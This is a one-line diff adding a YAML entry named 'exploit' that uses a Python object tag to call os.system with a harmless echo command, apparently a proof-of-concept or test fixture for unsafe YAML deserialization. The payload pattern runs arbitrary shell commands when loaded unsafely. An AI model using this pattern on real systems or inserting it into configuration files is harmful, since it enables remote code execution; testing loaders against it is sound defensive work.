@@ -1,0 +1,1 @@
+exploit: !!python/object/apply:os.system ["echo Hello, World!"]
